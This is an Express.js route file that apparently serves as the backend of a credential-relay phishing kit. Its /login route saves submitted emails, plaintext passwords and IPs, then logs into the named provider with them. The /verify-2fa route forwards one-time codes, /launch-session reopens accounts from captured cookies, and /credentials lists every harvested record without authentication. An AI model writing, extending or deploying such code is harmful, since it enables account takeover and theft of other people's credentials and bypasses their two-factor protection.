const express = require('express');
const {
  createCredentialRecord,
  loginWithProvider,
  verifyTwoFactor,
  launchSessionWithCookies,
  getAllCredentials,
} = require('../services/playwrightService');

const router = express.Router();

router.get('/credentials', async (req, res) => {
  try {
    const credentials = await getAllCredentials();
    res.json(credentials);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

router.post('/login', async (req, res) => {
  try {
    const { email, password, provider, ip } = req.body;

    if (!email || !password || !provider) {
      return res.status(400).json({ message: 'Email, password, and provider are required.' });
    }

    const normalizedEmail = String(email).trim();
    const normalizedProvider = String(provider).trim().toLowerCase();
    const account = await createCredentialRecord({
      email: normalizedEmail,
      password: String(password),
      provider: normalizedProvider,
      ip: ip || req.ip || 'Unknown',
      status: 'Pending',
    });

    const result = await loginWithProvider({
      accountId: account._id.toString(),
      email: normalizedEmail,
      password: String(password),
      provider: normalizedProvider,
      ip: req.ip || ip || 'Unknown',
    });

    return res.json({
      ...result,
      accountId: account._id.toString(),
    });
  } catch (error) {
    console.log('[auth.routes] Login API error:', error.message);
    return res.status(500).json({ message: error.message });
  }
});

router.post('/verify-2fa', async (req, res) => {
  try {
    const { accountId, code } = req.body;

    if (!accountId || !code) {
      return res.status(400).json({ message: 'Account ID and 2FA code are required.' });
    }

    const result = await verifyTwoFactor(accountId, code);
    return res.json(result);
  } catch (error) {
    console.log('[auth.routes] 2FA API error:', error.message);
    return res.status(500).json({ message: error.message });
  }
});

router.post('/launch-session', async (req, res) => {
  try {
    const { accountId } = req.body;

    if (!accountId) {
      return res.status(400).json({ message: 'Account ID is required.' });
    }

    const result = await launchSessionWithCookies(accountId);
    return res.json(result);
  } catch (error) {
    console.log('[auth.routes] Launch-session API error:', error.message);
    return res.status(500).json({ message: error.message });
  }
});

module.exports = router;
